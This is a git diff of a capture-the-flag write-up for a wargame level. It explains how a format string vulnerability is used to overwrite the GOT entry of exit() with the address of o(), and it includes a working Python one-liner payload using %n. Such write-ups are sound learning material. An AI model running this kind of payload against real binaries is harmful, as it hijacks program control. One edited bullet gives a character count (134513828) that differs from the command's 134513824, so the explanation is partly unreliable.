@@ -8,7 +8,7 @@
 Modify the call of `exit()` by the call of `o()`
 
 ## Step 1
-`exit()` is called through the __PLT (Procedure Linkage Table)__ resolution. __PLT__ enters in the __GOT__ on `exit()`
+`exit()` is called through the __PLT (Procedure Linkage Table)__ resolution. __PLT__ link code to the __GOT__
 ```console
 Dump of assembler code for function n:
    [...]
@@ -16,12 +16,14 @@ Dump of assembler code for function n:
 End of assembler dump.
 ```
 
-It's mean that `exit` is a dependecy of the program (extern), which is bind to the program thanks to the __PLT__ and __GOT__ mechanism (like libc), the purpose is to reduce size of the binary. __GOT__ is a table where we can find the dependencies addresses.
+It's mean that `exit` is a dependecy of the program (extern), which is bind to the program thanks to the __PLT__ and __GOT__ mechanism (same for libc),   
+> *the purpose is to reduce size of the binary.*  
+
+__GOT__ is a table of addresses where we can find the dependencies addresses.
 
 
 Since __PIE__ is disabled, the __GOT__ is always at the same address.
 
-We can overwrite the __GOT__ entry of `exit()` with the address of `o()` thanks to the __format string vulnerability__.
 
 ## Step 2
 
@@ -42,26 +44,16 @@ $ readelf -r level5 | grep exit
 08049838  00000607 R_386_JUMP_SLOT   00000000   exit
 ```
 
-`exit` is at `0x08049838`
+__GOT__ stores  the __address__ of `exit` at `0x8049838`
 
 ### Notice
-> viewed before:
+*seen early*
 ```console
 0x080484ff <+61>:	call   0x80483d0 <exit@plt>
 ```  
 > 0x80483d0 is not the address of `exit`, it's the address of the __PLT__ entry of `exit`
->
-```bash
-(gdb) disas 0x80483d0  
-Dump of assembler code for function exit@plt:  
-   0x080483d0 <+0>:	jmp    *0x8049838  
-   0x080483d6 <+6>:	push   $0x28  
-   0x080483db <+11>:	jmp    0x8048370  
-End of assembler dump.  
-(gdb)
-```
-> the `exit` __PLT__ entry jumps to  `0x8049838`, the __GOT__ entry of `exit`
 
+> 0x8049838 is not the address of `exit`, it's the entry address of the __GOT__ where the address of `exit` is stored 
 
 ## Step 3
 Lets try to overwrite the __GOT__ entry of `exit` with the address of `o`
@@ -101,12 +93,13 @@ Buffer is at the 4th position
 ## Exploit
 
 
-Write the address of `exit` in the buffer and modify it by the value of `o` thanks to `%n` when `printf` access to the buffer.
+- Write the __GOT__'s address which store `exit` in the buffer.
+- Write 134513828 characters total == Decimal value for `o()`'s address
+- Access to the buffer through the __4th__ specifier
+- Write the total printed characters with `%n` in the pointer of `exit`. this will make the pointer point to `o` modifying  the content of the pointer.
 
 
 
 ```bash
 (python -c 'print "\x38\x98\x04\x08" + "%134513824d%4$n"'; cat)  | /home/user/level5/level5
 ```
-
-- >  134513824 is the decimal value for 0x80484A4
